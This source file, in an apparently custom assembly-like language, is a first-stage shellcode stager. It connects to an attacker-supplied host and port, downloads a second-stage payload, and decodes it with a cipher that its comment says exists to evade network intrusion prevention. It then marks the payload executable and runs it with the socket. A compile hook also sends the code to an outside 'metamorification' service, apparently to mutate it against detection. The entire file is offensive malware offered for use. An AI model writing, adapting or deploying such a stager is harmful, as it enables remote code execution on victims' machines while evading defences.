@use "v1.0";

@import pwnasm;

compiler {
  optimize {
    size: "max",
  },
  target {
    isa_extensions: []
  }
}

@(fn meduda_metamorify() {
  @assert(@is_postprocessing(), "meduda_metamorify() must be used in a postprocessing context");

  let response = @auto(http::post("https://meduda.io/api/v1/metamorify", json: {
    "source": @compilation_unit_source(),
    "language": @getenv("NITRATE_VERSION"),
    "api_key": @secrets("meduda_api_key")
  }, verbose: "pretty"));

  @assert(response.status == 200, f"Meduda API request failed: {response.status} {response.reason}");
  @decore_and_replace(response.body);
  @success("Meduda metamorification successful");
  @finish_compilation(0);
});

fn _start() {
  std::@as_shellcode();   ~> We are writing shellcode

  defer @syscall(60, 0);   ~> Exit process

  /* --> PHASE 1: GET SECOND STAGE SHELLCODE
   * - The second stage shellcode is downloaded from a remote host.
   * - We check the first byte of the shellcode to ensure it is 'W'.
   **/

  /* Create socket and connect to remote host */
  let socket = @syscall(41, 2, 1, 0); ~> Create socket
  const addr: pwnasm.linux.MicroSocketAddr = {
    family: 2, port: @getenv("LPORT"), address: @getenv("LHOST")
  };
  @syscall(42, socket, addr, sizeof(addr)); ~> Connect to remote host

  /* Download second stage shellcode */
  const max_size = @getenv("SHELLCODE_MAX_SIZE");
  var shellcode: [u8] = pwnasm.linux.mmap(max_size);
  let n = @syscall(0, socket, shellcode, max_size, 0); ~> Read shellcode from socket
  retv n <= 0;

  /* Validate shellcode */
  retv shellcode[0] != 'W';

  /* --> PHASE 2: DECRYPT SECOND STAGE SHELLCODE
   * - This cipher is only for NIPS obfuscation purposes.
   **/
  for (let i = 1; i < n; i++) {
    shellcode[i] ^= shellcode[0] + i;

    if (i % 2 == 0) {
      shellcode[i] = ~shellcode[i];
    }
  }

  /* --> PHASE 3: EXECUTE SECOND STAGE SHELLCODE
   * - The second stage shellcode is executed with the same privileges as the first stage.
   * - We must remap the shellcode memory to be executable.
   * - The shellcode is executed as a function with the socket as an argument.
   * - The shellcode shalt not return.
   **/
  shellcode.privilege_remap<rx>();
  let f = shellcode reinterpret_cast_as fn(fd: i32): null;
  f(socket);
}

@post("@meduda_metamorify()");
